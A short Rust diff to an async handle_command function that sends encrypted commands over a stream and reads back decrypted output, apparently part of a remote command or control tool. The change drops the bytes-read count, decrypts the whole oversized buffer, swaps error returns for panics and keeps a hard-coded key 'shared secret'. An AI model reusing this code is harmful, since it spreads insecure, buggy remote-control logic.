@@ -193,14 +193,11 @@ pub async fn handle_command(
     stream.lock().await.write(&encrypted_command).await.expect("Error writing to stream");
     stream.lock().await.flush().await.expect("Error flushing stream");
     let mut cmdout = String::new();
-    let mut buffer = [0; 1024];
-    let n = match stream.lock().await.read(&mut buffer).await {
-        Ok(n) => n,
-        Err(_) => return Err("Error reading from stream".to_string()),
-    };
+    let mut buffer = [0; 65536];
+    stream.lock().await.read(&mut buffer).await.expect("Error reading from stream");
     let data = decrypt(&buffer, b"shared secret").expect("Failed to decrypt");
     if raw_connection {
-        cmdout = String::from_utf8(data[..n].to_vec()).unwrap();
+        cmdout = String::from_utf8(data.to_vec()).unwrap();
     } else {
         while !cmdout.contains("||cmd||") {
             cmdout.push_str(&String::from_utf8(data.to_vec()).unwrap());
